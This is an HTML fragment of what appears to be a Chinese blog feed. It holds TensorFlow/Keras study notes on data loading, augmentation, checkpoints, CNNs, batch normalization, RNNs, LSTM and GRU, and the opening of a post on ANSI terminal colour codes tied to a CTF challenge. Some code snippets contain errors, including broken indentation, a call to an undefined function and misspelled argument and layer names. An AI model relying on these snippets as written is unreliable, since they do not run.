class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><br>train_path = XXX<br>train_txt = XXX<br>x_train_savepath = XXX<br>y_train_savepath = XXX<br><br>test_path = XXX<br>test_txt = XXX<br>x_test_savepath = XXX<br>y_test_savepath = XXX<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GenerateData</span>(<span class="hljs-params">path,txt</span>):</span><br>    f = <span class="hljs-built_in">open</span>(txt,<span class="hljs-string">&#x27;r&#x27;</span>)<br>    data = f.readlines()<br>    f.close()<br>    x, y_=[], []<br>    <span class="hljs-keyword">for</span> content <span class="hljs-keyword">in</span> data:<br>        value = content.split() <span class="hljs-comment"># 以空格进行分割数据</span><br>        img_path = path + value[<span class="hljs-number">0</span>] <span class="hljs-comment"># 构建图片位置</span><br>        img = Image.<span class="hljs-built_in">open</span>(img_path) <span class="hljs-comment"># 打开图片</span><br>        img = np.array(img.convert(<span class="hljs-string">&#x27;L&#x27;</span>)) <span class="hljs-comment"># 将图片转为8位宽灰度值，通过np.array进行读入</span><br>        img  = img / <span class="hljs-number">256</span> <span class="hljs-comment"># 数据归一化</span><br>        x.append(img)<br>        y_.append(value[<span class="hljs-number">1</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;loading: &quot;</span> + img_path) <span class="hljs-comment"># 提示信息</span><br>        <br>    x = np.array(x) <span class="hljs-comment"># 变为np.array格式</span><br>    y_ = np.array(y_) <span class="hljs-comment"># 变为np.array格式</span><br>    y_ = y_.astype(np.int64) <span class="hljs-comment"># 变为np.int64整型</span><br>    <span class="hljs-keyword">return</span> x,y_<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check</span>(<span class="hljs-params">x_train_savepath,y_train_savepath,x_test_savepath,y_test_savepath</span>):</span><br>    <span class="hljs-keyword">if</span> os.path.exists(x_train_savepath) <span class="hljs-keyword">and</span> os.path.exists(y_train_savepath) <br>    <span class="hljs-keyword">and</span> os.path.exists(x_test_savepath) <span class="hljs-keyword">and</span> os.path.exists(y_test_savepath):<br>        <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Load Datasets-----------------&#x27;</span>)<br>    <br>    x_train_save = np.load(x_train_savepath)<br>    y_train = np.load(y_train_savepath)<br>    x_test_save = np.load(x_test_savepath)<br>    y_test = np.load(y_test_savepath)<br>    x_train = np.reshape(x_train_save, (<span class="hljs-built_in">len</span>(x_train_save), <span class="hljs-number">28</span>, <span class="hljs-number">28</span>))<br>    x_test = np.reshape(x_test_save, (<span class="hljs-built_in">len</span>(x_test_save), <span class="hljs-number">28</span>, <span class="hljs-number">28</span>))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Generate Datasets-----------------&#x27;</span>)<br>    <br>    x_train, y_train = generateds(train_path, train_txt)<br>    x_test, y_test = generateds(test_path, test_txt)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;-------------Save Datasets-----------------&#x27;</span>)<br>    <br>    x_train_save = np.reshape(x_train, (<span class="hljs-built_in">len</span>(x_train), -<span class="hljs-number">1</span>)) <span class="hljs-comment"># 将数组拉成一维数组</span><br>    x_test_save = np.reshape(x_test, (<span class="hljs-built_in">len</span>(x_test), -<span class="hljs-number">1</span>)) <span class="hljs-comment"># 将数组拉成一维数组</span><br>    np.save(x_train_savepath, x_train_save)<br>    np.save(y_train_savepath, y_train)<br>    np.save(x_test_savepath, x_test_save)<br>    np.save(y_test_savepath, y_test)<br></code></pre></td></tr></table></figure><h3 id="数据增强">数据增强</h3><p>数据增强可以帮助我们扩充数据集，对于图像而言就是简单的形变，可以用于应对图片拍照角度的不同而照成的一定形变</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">image_gen_train = tf.keras.preprocessing.image.ImageDataGenerator(<br>rescale=所有数据将乘以该数值, <span class="hljs-comment"># 当为图像的时候，分母为255时，可以归至 0~1 的区间</span><br>rotation_range=随机旋转角度数范围,<br>    width_shift_range=随机宽度偏移量, <br>    height_shift_range =随机高度偏移量,<br>horizontal_flip=是否随机水平翻转 <span class="hljs-comment"># True or False</span><br>zoom_range =随机缩放的范围[<span class="hljs-number">1</span>-n,<span class="hljs-number">1</span>+n] )  <span class="hljs-comment"># eg： 0.5</span><br><br>image_gen_train.fit(x_train)<br></code></pre></td></tr></table></figure><h3 id="断点续训">断点续训</h3><p>断点续训可以让我们训练不用每次都从头开始训练，而不用每次重头开始训练</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 读取模型</span><br>load_weights(路径文件名) <span class="hljs-comment"># .ckpt 文件</span><br><span class="hljs-comment"># 保存模型</span><br>tf.keras.callbacks.ModelCheckpoint(<br>filepath=文件名,<br>save_weights_only=<span class="hljs-literal">True</span>/<span class="hljs-literal">False</span>,<br>save_best_only=<span class="hljs-literal">True</span>/<span class="hljs-literal">False</span>)<br><br>history = model.fit(callbacks=[cp_callback])<br></code></pre></td></tr></table></figure><h3 id="参数提取">参数提取</h3><p>我们可以把参数存入文本，观察训练的参数，我们可以采用print进行输出，但是当输出信息过长时中间的部分会被省略号所替代，我们可以通过下面的函数把我们模型中可以训练的参数进行打印</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 返回模型中可训练的参数</span><br>model.trainable_variables<br><span class="hljs-comment"># 设置print输出格式</span><br>np.set_printoptions(threshold=超过多少省略显示) <span class="hljs-comment"># np.inf 表示无限大</span><br><span class="hljs-comment"># eg</span><br>np.set_printoptions(threshold=np.inf)<br><span class="hljs-built_in">print</span>(model.trainable_variables)<br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./weights.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> model.trainable_variables:<br>    file.write(<span class="hljs-built_in">str</span>(v.name)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(v.shape)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    file.write(<span class="hljs-built_in">str</span>(v.numpy())+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <br>file.close()<br></code></pre></td></tr></table></figure><h3 id="acc-loss-可视化">acc/loss 可视化</h3><p>在训练过程中其实对训练集、测试集、训练集准确率、测试集准确率都有着对应的记录，我们可以将其进行提取，以可视化的方式来观察我们训练的效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 提取方式</span><br>history = model.fit(训练集的输入特征,训练集的标签,<br>         batch_size= , epochs= ,<br>         validation_split=从训练集划分多少比例给测试集,<br>         validation_freq=多少次epoch测试一次)<br><span class="hljs-comment"># history </span><br>训练集 loss : loss<br>测试集 loss : val_loss<br>训练集准确率 : sparse_categorical_accuracy<br>测试集准确率 : val_sparse_categorical_accuracy<br></code></pre></td></tr></table></figure><p>当我们拿到对应的数据后我们便可以用 matplotlib 进行绘图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#需要导入下面的包</span><br><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt <br><span class="hljs-comment"># 绘图</span><br>acc = history.history[<span class="hljs-string">&#x27;sparse_categorical_accuracy&#x27;</span>] <span class="hljs-comment"># 训练集准确率</span><br>val_acc = history.history[<span class="hljs-string">&#x27;val_sparse_categorical_accuracy&#x27;</span>] <span class="hljs-comment"># 测试集准确率</span><br>loss = history.history[<span class="hljs-string">&#x27;loss&#x27;</span>] <span class="hljs-comment"># 训练集 loss</span><br>val_loss = history.history[<span class="hljs-string">&#x27;val_loss&#x27;</span>] <span class="hljs-comment"># 测试集 loss</span><br><br><span class="hljs-comment"># plt.subplot 将图像分为一行两列</span><br>plt.subplot(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>) <span class="hljs-comment"># 划出第一列</span><br>plt.plot(acc, label=<span class="hljs-string">&#x27;Training Accuracy&#x27;</span>) <span class="hljs-comment"># 设置图标题</span><br>plt.plot(val_acc, label=<span class="hljs-string">&#x27;Validation Accuracy&#x27;</span>)<br>plt.title(<span class="hljs-string">&#x27;Training and Validation Accuracy&#x27;</span>)<br>plt.legend() <span class="hljs-comment"># 画出图例</span><br><br>plt.subplot(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>) <span class="hljs-comment"># 划出第二列</span><br>plt.plot(loss, label=<span class="hljs-string">&#x27;Training Loss&#x27;</span>)<br>plt.plot(val_loss, label=<span class="hljs-string">&#x27;Validation Loss&#x27;</span>)<br>plt.title(<span class="hljs-string">&#x27;Training and Validation Loss&#x27;</span>)<br>plt.legend()<br>plt.show()<br></code></pre></td></tr></table></figure><h3 id="应用">应用</h3><p>之前所用到的东西都不同于其他的程序，仅仅有了一个网络，但是要想真正运行起来需要我们编写一个应用程序，可以将我们的输入进行预测，给出一共预测的结果，在 tensorflow 中有对应的函数将我们的前向传播进行执行应用给出一个对应的预测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 返回前向传播计算结果</span><br>predict(输入特征,batch_size=整数)<br><span class="hljs-comment"># eg</span><br>model = tf.keras.models.Sequential([<br>tf.keras.layers.Flatten(),<br>tf.keras.layers.Dense(<span class="hljs-number">128</span>,actvation=<span class="hljs-string">&#x27;relu&#x27;</span>),<br>tf.keras.layers.Dense(<span class="hljs-number">10</span>,activation=<span class="hljs-string">&#x27;softmax&#x27;</span>)<br>]) <span class="hljs-comment"># 复现模型 —— 前向传播</span><br>model.load_weights(model_save_path) <span class="hljs-comment"># 加载参数</span><br>result = model.predict(x_predict) <span class="hljs-comment"># 预测结果</span><br></code></pre></td></tr></table></figure><h2 id="卷积神经网络">卷积神经网络</h2><p>卷积就是特征提取器：卷积-&gt;批标准化-&gt;激活-&gt;池化</p><p>卷积神经网络便是借助卷积核提取特征后送入全连接网络</p><h3 id="卷积计算过程">卷积计算过程</h3><p>卷积计算那是一种有效提取图像特征的方法</p><p>一般会用一个正方形的卷积核,按指定步长,在输入特征图上滑动，遍历输入特征图中的每个像素点。每一个步长，卷积核会与输入特征图出现重合区域，重合区域对应元素相乘、求和再加上偏置项得到输出特征的一个像素点</p><p>输入特征图的深度(channel数)，决定了当前层卷积核的深度;当前层卷积核的个数，决定了当前层输出特征图的深度。</p><p><img src="https://s2.loli.net/2023/01/26/BjVtpJM9Znq3deN.png" alt=""></p><p>对应元素相乘之后求和再加上对应的偏置项 b</p><h3 id="感受野-Receptive-Field">感受野(Receptive Field)</h3><p>卷积神经网络各输出特征图中的每个像素点，在原始输入图片上映射区域的大小。</p><h3 id="全零填充-Padding">全零填充(Padding)</h3><p>卷积计算保持输入特征图的尺寸不变可以使用全零填充</p><p><img src="https://s2.loli.net/2023/01/26/OTXjgQCDPcwyqiL.png" alt=""></p><h3 id="卷积核计算">卷积核计算</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.Conv2D(<br>filters=卷积核个数,<br>kernel_size=卷积核尺寸, <span class="hljs-comment"># 正方形写核长整数，或(核高 h ，核宽 w)</span><br>strides=滑动步长, <span class="hljs-comment"># 横纵向相同写步长整数，或(纵向步长 h ，横向步长 w)，默认为 1</span><br>    padding=<span class="hljs-string">&quot;same&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;valid&quot;</span> <span class="hljs-comment"># 使用全零填充是&quot;same&quot;，不使用是&quot;valid&quot;(默认)</span><br>    activation=<span class="hljs-string">&quot;relu&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;sigmoid&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;softmax&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;tanh&quot;</span> <span class="hljs-comment"># 如有批标准化此处不写</span><br>    input_shape=(高,宽,通道数) <span class="hljs-comment"># 输入特征图维度，可省略</span><br>)<br><span class="hljs-comment"># eg</span><br>model = tf.keras.models.Sequential([<br>    Conv2D(<span class="hljs-number">6</span>,<span class="hljs-number">5</span>,padding=<span class="hljs-string">&#x27;valid&#x27;</span>,activation=<span class="hljs-string">&#x27;sigmoid&#x27;</span>),<br>    MaxPool2D(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),<br>    Conv2D(<span class="hljs-number">6</span>,(<span class="hljs-number">5</span>,<span class="hljs-number">5</span>),padding=<span class="hljs-string">&#x27;valid&#x27;</span>,activation=<span class="hljs-string">&#x27;sigmoid&#x27;</span>),<br>    MaxPool2D(<span class="hljs-number">2</span>,(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)),<br>    Conv2D(filters=<span class="hljs-number">6</span>, kernel_size=(<span class="hljs-number">5</span>,<span class="hljs-number">5</span>),padding=<span class="hljs-string">&#x27;valid&#x27;</span>,activation=<span class="hljs-string">&#x27;sigmoid&#x27;</span>),<br>    MaxPool2D(pool_size=(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),strides=<span class="hljs-number">2</span>),<br>    Flatten(),<br>    Dense(<span class="hljs-number">10</span>,activation=<span class="hljs-string">&#x27;softmax&#x27;</span>)<br>])<br></code></pre></td></tr></table></figure><h3 id="批标准化-BN">批标准化(BN)</h3><p>标准化：使数据符合 0 均值， 1 为标准差的分布</p><p>批标准化：对一小批数据(batch)进行标准化处理，常用在卷积和激活之间</p><blockquote><p>卷积 -&gt; 批标准化 -&gt; 激活</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.BatchNormalizaton()<br><span class="hljs-comment"># eg</span><br>model = tf.keras.models.Sequential([<br>    Conv2D(filters=<span class="hljs-number">6</span>,kernel_size=(<span class="hljs-number">5</span>,<span class="hljs-number">5</span>),padding=<span class="hljs-string">&#x27;same&#x27;</span>),<span class="hljs-comment"># 卷积层</span><br>    BatchNormalization(), <span class="hljs-comment"># BN 层</span><br>    Activation(<span class="hljs-string">&#x27;relu&#x27;</span>), <span class="hljs-comment"># 激活层</span><br>    MaxPool2D(pool_size=(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>),strides=<span class="hljs-number">2</span>,padding=<span class="hljs-string">&#x27;same&#x27;</span>), <span class="hljs-comment"># 池化层</span><br>    Dropout(<span class="hljs-number">0.2</span>) <span class="hljs-comment"># dropout 层</span><br>])<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/26/5BcELTauxlSUp2F.png" alt=""></p><p>批标准化操作会让每个像素点进行减均值除以标准差的自更新计算，在经过标准化操作后将其重新拉回到 0 均值，数据更集中于激活函数的线性区域，提升了激活函数对输入数据的区分力</p><p>但是简单的数据标准化使特征数据完全满足了正态分布，集中在激活函数中间的线性区域，使激活函数失去了非线性特性，因此BN操作中为每个卷积核引入了两个可训练参数用于控制缩放和偏移</p><p><img src="https://s2.loli.net/2023/01/26/VaAutgynBvhpbFm.png" alt=""></p><p>在反向传播中使其一起被优化，进而优化数据的分布</p><h3 id="池化">池化</h3><p>池化操作用于减少卷积神经网络中特征数据量，最大值池化可提取图片纹理，均值池化可保留背景特征。</p><p>最大池化：将池化核中的最大值进行保留</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.MaxPool2D(<br>pool_size=池化核尺寸, <span class="hljs-comment"># 正方形写核长整数，或(核高 h ，核宽 w)</span><br>    strides=池化步长, <span class="hljs-comment"># 横纵向相同写步长整数，或(纵向步长 h ，横向步长 w)，默认为 pool_size</span><br>    padding=<span class="hljs-string">&quot;same&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;valid&quot;</span> <span class="hljs-comment"># 使用全零填充是&quot;same&quot;，不使用是&quot;valid&quot;(默认)</span><br>)<br></code></pre></td></tr></table></figure><p>均值池化：将池化核中的数据的平均值进行替代</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.AveragePooling2D(<br>pool_size=池化核尺寸, <span class="hljs-comment"># 正方形写核长整数，或(核高 h ，核宽 w)</span><br>    strides=池化步长, <span class="hljs-comment"># 横纵向相同写步长整数，或(纵向步长 h ，横向步长 w)，默认为 pool_size</span><br>    padding=<span class="hljs-string">&quot;same&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;valid&quot;</span> <span class="hljs-comment"># 使用全零填充是&quot;same&quot;，不使用是&quot;valid&quot;(默认)</span><br>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/26/AHRCp17FoYqsyxV.png" alt=""></p><h3 id="舍弃">舍弃</h3><p>在神经网络训练时，将将隐藏层的一部分神经元按照一定概率从神经网络中暂时舍弃。神经网络使用时，被舍弃的神经元恢复链接。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.Dropout(舍弃的概率)<br></code></pre></td></tr></table></figure><h2 id="循环神经网络">循环神经网络</h2><p>使用循环神经网络实现连续数据的预测，即借助循环核提取时间特征后送入全链接网络</p><h4 id="循环核">循环核</h4><p>参数时间共享，循环层提取时间信息</p><p><img src="https://s2.loli.net/2023/01/26/D6CsmWwzo1p4BZa.png" alt=""></p><h3 id="循环计算层">循环计算层</h3><p>循环计算层向输出方向生长</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.SimpleRNN(记忆体个数,activation=<span class="hljs-string">&#x27;激活函数&#x27;</span>,return_sequences=是否每个时刻输出ht到下一层) <span class="hljs-comment"># ht 为记忆体内存储的状态信息</span><br><span class="hljs-comment"># activation 不写默认使用tanh</span><br><span class="hljs-comment"># return_sequences=True 各时间步输出ht</span><br><span class="hljs-comment"># return_sequences=False 仅最后时间步输出ht (默认)</span><br><span class="hljs-comment"># eg</span><br>SimpleRNN(<span class="hljs-number">3</span>,return_sequences=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>入RNN时，x_train维度：[送入样本数,循环核时间展开步数,每个时间步输入特征个数]</p><p><img src="https://s2.loli.net/2023/01/26/Iv3usBQFLTnoeOJ.png" alt=""></p><h3 id="Embedding-单词编码">Embedding 单词编码</h3><p>独热码:数据量大过于稀疏，映射之间是独立的，没有表现出关联性</p><p>Embedding:是一种单词编码方法，用低维向量实现了编码，这种编码通过神经网络训练优化，能表达出单词间的相关性。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.Embedding(词汇表大小,编码维度)<br></code></pre></td></tr></table></figure><p>编码维度就是用几个数字表达一个单词</p><p>对1-100进行编码，[4]编码为[0.25，0.1,0.11]</p><p>例:tf.keras.layers.Embedding(100,3)</p><p>入Embedding时， x_train维度:[送入样本数，循环核时间展开步数]</p><h3 id="LSTM-长短记忆网络">LSTM 长短记忆网络</h3><p><img src="https://s2.loli.net/2023/01/26/M62GFqoZHlP3sdW.png" alt=""></p><blockquote><p>$W_i$、$b_i$、$W_f$、$b_f$、$W_o$、$b_o$均为待训练参数，再Sigmoid函数的作用下归一化</p><p>门限取值范围为(0,1)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.LSTM(记忆体个数,return_sequences=是否返回输出)<br><span class="hljs-comment"># return_sequences=True 各时间步输出ht</span><br><span class="hljs-comment"># return_sequences=False 仅最后时间输出ht(默认)</span><br></code></pre></td></tr></table></figure><h3 id="GRU-网络">GRU 网络</h3><p>GRU使记忆体 ht 融合了长期记忆和短期记忆</p><p><img src="https://s2.loli.net/2023/01/26/nI3pVMDFJe6kQ7d.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tf.keras.layers.GRU(记忆体个数,return_sequences=是否返回输出)<br><span class="hljs-comment"># return_sequences=True 各时间步输出ht</span><br><span class="hljs-comment"># return_sequences=False 仅最后时间输出ht(默认)</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ANSI转义码</title>
    <link href="/2023/01/05/ANSI%E8%BD%AC%E4%B9%89%E7%A0%81/"/>
    <url>/2023/01/05/ANSI%E8%BD%AC%E4%B9%89%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>最近期末考试考了一部分，间隙逛群的时候发现群友打的<code>CatCTF</code>的<code>Misc</code>中的<code>CatFlag</code>有点意思，通过一个简单的<code>cat flag</code>操作就可以拿到<code>flag</code>，但是在<code>vim</code>、<code>010Editor</code>下拿<code>flag</code>比较的困难，同时如果直接使用<code>strings flag</code>也是拿不到<code>flag</code>，作为一个签到题，可能确实签到(对我这种彩笔可能拿不到),同时作者也给出了出题原理</p><blockquote><p><a href="https://en.wikipedia.org/wiki/ANSI_escape_code">https://en.wikipedia.org/wiki/ANSI_escape_code</a></p></blockquote><p>简单的去了解了一下，发现了一些比较好玩的东西，同时也顺便了解到一些题目中<code>shell</code>窗口是如何实现输出彩色字以及彩色背景等有关内容(XD)，本文记录一下关于这个题涉及到的<code>ANSI转义码</code>中的一些小玩意</p><h2 id="富文本">富文本</h2><h3 id="字体颜色">字体颜色</h3><p>有没有觉得直接输出一个白色字符串有些多少单调且无聊？想不想输出彩色的字符？</p><p>最基本的<code>ANSI转义码</code>是涉及呈现文本的代码，可以让我们修改文字的颜色、背景或者是添加一些修饰等，我们以<code>Python3</code>的环境为例子：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello&quot;</span>)<br></code></pre></td></tr></table></figure><p>我们在控制台输入这个指令，可以看到字体是白色的：</p><p><img src="https://s2.loli.net/2023/01/04/RZd8TSV9lvFJ5m3.png" alt="image-20230104232231945"></p><p>但是我们加入一个<code>ANSI转义码</code>：<code>\u001b[31m</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\u001b[31mHello&quot;</span>)<br></code></pre></td></tr></table></figure><p>此时的输出是：</p><p><img src="https://s2.loli.net/2023/01/04/Cbr6XUvVx9hIwY7.png" alt="image-20230104232349539"></p><p>可以看到我们的输出结果变成了红色，且下面一行也是红色，而这便是<code>ANSI颜色</code>的一种工作方式，当我们设置了某种颜色后，其便会一直存在，直到我们换了一种颜色或者打出重置代码</p><p>我们输入重置代码来进行恢复：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\u001b[0m&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/mfwh1SQ4HTtb8kA.png" alt="image-20230104232612082"></p><p>可以看到已经变回了原来的白色了。根据<code>ANSI颜色</code>的工作特性，我们一般都是讲要输入的字符串包裹在颜色代码以及重置代码之间,以此来控制我们所需要的彩色部分</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\u001b[31mHello\u001b[0m&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/04/kYT89Hx6EnRaVQJ.png" alt="image-20230104232815303"></p><p>我们简单的了解了颜色的工作原理后我们列出一些颜色供给大家进行选择：</p><h4 id="8-色彩">8 色彩</h4><p>基本上所有的控制台都支持以下的颜色：</p><ul><li>黑色：<code>\u001b[30m</code></li><li>红色：<code>\u001b[31m</code></li><li>绿色：<code>\u001b[32m</code></li><li>黄色：<code>\u001b[33m</code></li><li>蓝色：<code>\u001b[34m</code></li><li>洋红色：<code>\u001b[35m</code></li><li>青色：<code>\u001b[36m</code></li><li>白色：<code>\u001b[37m</code></li></ul><p>我们将其都进行输出：</p><p><img src="https://s2.loli.net/2023/01/04/z5I4JQr8RPcBhnu.png" alt="image-20230104233241429"></p><h4 id="16-色彩">16 色彩</h4><p>对于大多数终端，除了上述 8 种基本的颜色集外，还支持更明亮的颜色：</p><ul><li>亮黑色：<code>\u001b[30;1m</code></li><li>亮红色：<code>\u001b[31;1m</code></li><li>亮绿色：<code>\u001b[32;1m</code></li><li>亮黄色：<code>\u001b[33;1m</code></li><li>亮蓝色：<code>\u001b[34;1m</code></li><li>明亮的洋红色：<code>\u001b[35;1m</code></li><li>亮青色：<code>\u001b[36;1m</code></li><li>亮白：<code>\u001b[37;1m</code></li></ul><p>其与 8 个基本的色彩的区别在于其代码中间增加了一个：<code>;1</code></p><p><img src="https://s2.loli.net/2023/01/04/dROajFy3XmhKLUt.png" alt="image-20230104233700947"></p><h4 id="256-色彩">256 色彩</h4><p>一些终端支持256色扩展颜色集，其颜色代码形势如下：<code>\u001b[38;5;$&#123;ID&#125;m</code></p><p>我们换到<code>VSC</code>的<code>shell</code>进行演示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">for</span> i <span 